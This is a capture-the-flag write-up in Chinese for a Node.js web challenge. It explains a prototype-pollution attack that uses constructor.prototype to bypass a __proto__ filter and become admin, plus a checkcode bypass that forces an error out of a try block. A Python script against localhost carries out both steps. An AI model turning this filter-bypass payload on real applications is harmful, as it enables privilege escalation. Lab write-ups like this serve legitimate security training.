# Nodejs Bypass

**Author:** tel

**Difficulty:** Medium

**Category:** Web

## 题目描述

没有人比我更懂 nodejs

## 题目解析

**暴露端口：`80`**

登录 admin 获取 flag1，原型链污染 `req.user="admin"`，过滤了 `__proto__`，使用 `constructor.prototype` 绕过

绕过 checkcode 获取 flag2，需要在 flag2 中触发报错，跳出 `try` 代码块

```py
import requests

url = "http://127.0.0.1:3000/"

# flag1
data = {
    "username":"admin",
    "password":"11",
	"constructor":{
		"prototype":{
			"user":"admin"
		}
	}
}
print(requests.post(url,json=data).text)
r = requests.get(url+"flag1")
print("flag1: " + r.headers["This_Is_The_Flag1"])

# flag2
data = {
    "checkcode":[
        1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
    ]
}
r = requests.post(url+"flag2",data=data)
print(r.json()["msg"])
```
